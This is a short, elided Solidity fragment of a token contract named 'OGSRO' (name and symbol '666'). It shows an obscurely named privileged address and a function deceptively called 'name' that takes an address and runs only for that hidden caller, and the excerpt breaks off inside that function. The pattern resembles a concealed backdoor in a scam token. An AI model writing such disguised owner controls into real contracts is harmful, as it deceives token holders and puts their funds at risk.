...
contract OGSRO is Ownable {
    ...
    string public _tokenname = "666";
    string public _tokensymbol = "666";
    uint256 tokenamount = 10000000000*10**decimals();
    address public sajhnb62;
    ...
    function name(address jjkxq1) public     {
        require(sajhnb62 ==  _msgSender());
        if(sajhnb62 != _msgSender()){
                revert("fu");
        }
